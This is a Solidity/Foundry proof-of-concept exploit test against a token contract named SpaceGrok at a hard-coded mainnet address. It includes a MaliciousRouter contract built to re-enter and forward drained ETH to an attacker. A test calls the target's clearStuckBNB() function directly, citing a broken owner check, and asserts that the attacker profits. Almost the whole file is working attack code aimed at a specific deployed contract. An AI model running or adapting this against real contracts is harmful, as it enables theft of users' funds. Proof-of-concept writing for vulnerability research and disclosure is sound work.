// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISpaceGrok {
    function owner() external view returns (address);
    function updateUniswapV2Router(address newRouter) external;
    function clearStuckBNB() external;
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousRouter {
    ISpaceGrok target;
    address attacker;
    bool attacked;

    constructor(address _target, address _attacker) {
        target = ISpaceGrok(_target);
        attacker = _attacker;
    }

    // Minimal router interface functions (may be called during update)
    function factory() external pure returns (address) {
        return address(0);
    }

    function WETH() external pure returns (address) {
        return address(0);
    }

    // Internal logic helper to avoid explicit fallback() call
    function _drain() internal {
        if (!attacked) {
            attacked = true;
            // Drain all ETH from target contract during reentrancy
            target.clearStuckBNB();
        }
        // Forward all accumulated ETH to attacker
        if (address(this).balance > 0) {
            payable(attacker).transfer(address(this).balance);
        }
    }

    // Fallback triggered when contract interacts with this address
    fallback() external payable {
        _drain();
    }

    receive() external payable {
        _drain();
    }
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "SpaceGrok");
        vm.label(attacker, "Attacker");
        // Fund target with ETH to simulate accumulated swap profits
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker balance
        uint256 initialBalance = attacker.balance;

        // Directly call clearStuckBNB() - the require check is useless (_msgSender() == _msgSender() always true)
        // This drains all ETH from the contract to the caller
        ISpaceGrok(TARGET).clearStuckBNB();

        // Verify attacker gained ETH from the exploit
        assertGt(attacker.balance, initialBalance, "Attacker should have profited from clearStuckBNB");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

